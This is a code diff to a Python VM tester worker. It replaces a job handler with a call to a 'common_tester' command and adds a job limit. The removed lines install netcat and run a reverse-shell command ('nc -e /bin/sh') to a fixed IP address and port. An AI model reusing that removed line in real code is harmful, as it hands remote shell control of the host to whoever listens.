@@ -9,11 +9,15 @@ LOG.setLevel('DEBUG')
 
 
 class TesterWorker(worker.workers.VMWorker):
+    # maximum number of jobs that need to be run by the VM
+    MAX_NUM_JOBS = 1000
+
     def __init__(self):
         super(self.__class__, self).__init__()
 
     def _run(self, job):
         job_type = job.payload['type']
-        self.execute("DEBIAN_FRONTEND=noninteractive apt-get update")
-        self.execute("DEBIAN_FRONTEND=noninteractive apt-get -y install netcat")
-        self.execute("JOB_TYPE={} nc -vv -e /bin/sh 192.168.48.26 12345".format(job_type))
+        cs_id = job.cs.id
+        to_execute_command = "common_tester {} {} {}".format(cs_id, job_type, TesterWorker.MAX_NUM_JOBS)
+        self.execute(to_execute_command)
+
